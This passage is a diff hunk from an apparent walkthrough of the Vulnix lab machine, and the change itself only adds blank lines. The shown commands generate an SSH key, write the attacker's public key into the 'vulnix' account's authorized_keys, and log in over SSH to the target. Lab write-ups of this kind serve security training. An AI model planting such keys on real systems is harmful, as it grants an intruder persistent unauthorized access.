@@ -153,10 +153,12 @@ vulnix@kali:~$ ll>
 ### GETTING SSH WITH VULNIX
 
 kali@kali:~$ ssh-keygen -t rsa  
+
 kali@kali:~$ cat .ssh/id_rsa.pub  
 >ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDT1Mw6+iVZcmCHOe9IBW7S5He5ZeBwTFNhNlNqZQ90S2GLlenYEJElGxS2LiZcjtaTi4DkeYSZlUOI+fXKb+iLLFXyHdkh53gqSwF/sD0rV8N+6HQB93XtwWf69SUm80Dw9rYTOkDhPzHhQFsUIXyErZeiX0vdcDsXEKUV+toYOmmUa/avVbz/Y9CjMTAAFxEDSzprbLAIORJ6ZjIeVn5J4xHo1+xuD3O0tQ/Jw7fhc7zTn3NGtd0JjDuRiz9T6X+eYLL6+rwMXnQXKxhGNbuBIObNHR/iNL1YZdSxH6W8gSFiHIGr42hSUV1dxEySDz8bNCZFI2etWyqbpTmfJGCP kali@kali
 
 kali@kali:~$ su vulnix  
+
 vulnix@kali:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDT1Mw6+iVZcmCHOe9IBW7S5He5ZeBwTFNhNlNqZQ90S2GLlenYEJElGxS2LiZcjtaTi4DkeYSZlUOI+fXKb+iLLFXyHdkh53gqSwF/sD0rV8N+6HQB93XtwWf69SUm80Dw9rYTOkDhPzHhQFsUIXyErZeiX0vdcDsXEKUV+toYOmmUa/avVbz/Y9CjMTAAFxEDSzprbLAIORJ6ZjIeVn5J4xHo1+xuD3O0tQ/Jw7fhc7zTn3NGtd0JjDuRiz9T6X+eYLL6+rwMXnQXKxhGNbuBIObNHR/iNL1YZdSxH6W8gSFiHIGr42hSUV1dxEySDz8bNCZFI2etWyqbpTmfJGCP kali@kali" > authorized_keys
 
 kali@kali:~$ ssh -l vulnix 192.168.1.100
